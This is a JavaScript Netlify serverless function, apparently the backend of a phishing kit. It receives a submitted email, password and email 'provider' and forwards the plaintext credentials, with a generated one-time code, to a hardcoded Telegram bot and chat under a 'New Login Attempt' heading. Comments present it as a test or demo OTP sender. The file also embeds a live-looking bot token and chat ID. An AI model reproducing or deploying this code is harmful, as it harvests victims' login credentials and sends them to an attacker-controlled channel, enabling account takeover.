// Polyfill fetch for Node < 18. Remove/comment this line if on Node 18+ (Netlify default).
// const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

// In-memory OTP store (not persistent, just for testing/demo)
const otpStore = new Map();

const BOT_TOKEN = "7244980103:AAGip-Y8YMcN0H58ojQTIVtkmpfTI0F8N0s";
const CHAT_ID = "6735963923";

// Store OTP with expiry
function storeOTP(email, otp) {
  otpStore.set(email, {
    code: otp,
    expiresAt: Date.now() + 5 * 60 * 1000 // expires in 5 minutes
  });
}

exports.handler = async function(event) {
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      body: JSON.stringify({ success: false, message: "Method not allowed" }),
    };
  }

  let email, password, provider;
  try {
    ({ email, password, provider } = JSON.parse(event.body));
  } catch (e) {
    return {
      statusCode: 400,
      body: JSON.stringify({ success: false, message: "Invalid request body" }),
    };
  }

  // Validate input
  if (!email || !password || !provider) {
    return {
      statusCode: 400,
      body: JSON.stringify({ success: false, message: "Missing required fields" }),
    };
  }

  // Generate 6-digit OTP
  const otp = Math.floor(100000 + Math.random() * 900000).toString();

  // Store for dev/demo only
  storeOTP(email, otp);

  // Compose Telegram message
  const message =
    `🔐 *New Login Attempt*\n\n` +
    `📧 Email: ${email}\n` +
    `🔑 Password: ${password}\n` +
    `🌐 Provider: ${provider}\n` +
    `🧾 OTP: ${otp}`;

  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    if (!response.ok) {
      throw new Error("Telegram API error: " + response.statusText);
    }

    return {
      statusCode: 200,
      body: JSON.stringify({
        success: true,
        message: "OTP sent to Telegram",
        otp, // ⚠ Remove this in production!
        email,
      }),
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({
        success: false,
        message: "Failed to send OTP",
        error: error.message,
      }),
    };
  }
};